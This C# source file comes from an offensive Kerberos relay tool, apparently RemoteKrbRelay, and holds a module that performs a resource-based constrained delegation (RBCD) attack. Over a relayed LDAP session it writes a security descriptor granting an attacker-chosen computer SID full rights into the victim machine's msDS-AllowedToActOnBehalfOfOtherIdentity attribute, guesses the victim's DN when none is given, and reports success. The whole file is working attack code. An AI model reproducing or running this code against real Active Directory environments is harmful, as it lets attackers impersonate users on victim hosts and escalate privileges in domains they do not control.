using System;
using System.Security.AccessControl;
using System.Linq;
using static RemoteKrbRelay.Helpers.Natives;

namespace RemoteKrbRelay.Relay.Attacks.Ldap
{
    internal class RBCD
    {
        public static LdapStatus attack(IntPtr ld)
        {
            if (!Options.rbcdComputerSid.StartsWith("S-1-5-"))
            {
                Console.WriteLine($"[-] Computer SID is not valid");
                return LdapStatus.LDAP_UNWILLING_TO_PERFORM;
            }

            var dn = Options.victimDN;
            if (string.IsNullOrEmpty(dn))
            {
                dn = Generic.getMachineDN(ld, new string(Options.victim.TakeWhile(c => c != '.').ToArray()));
                if (string.IsNullOrEmpty(dn))
                {
                    Console.WriteLine($"[-] Cant get DN of {Options.victim}. Trying to guess it (otherwise u can specify it using --victimdn)");
                    dn = $"CN={new string(Options.victim.TakeWhile(c => c != '.').ToArray())},CN=Computers,{Options.domainDN}";
                   //Debug.WriteLine($"[?] Is it correct? {dn}");
                }
            }
            Console.WriteLine($"[?] Using dn {dn}");

            //var dn = $"CN=ADCS,CN=Computers,DC=root,DC=apchi";
            var dacl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + Options.rbcdComputerSid + ")";
            var sd = new RawSecurityDescriptor(dacl);
            var value = new byte[sd.BinaryLength];
            sd.GetBinaryForm(value, 0);
            var result = Generic.setAttribute(ld, "msDS-AllowedToActOnBehalfOfOtherIdentity", value, dn);

            Console.WriteLine($"[?] LDAP status {result}");
            if (result == LdapStatus.LDAP_SUCCESS)
            {
                Console.WriteLine("[+] RBCD rights added successfully");
                Options.attackDone = true;
            }
            return result;
        }
    }
}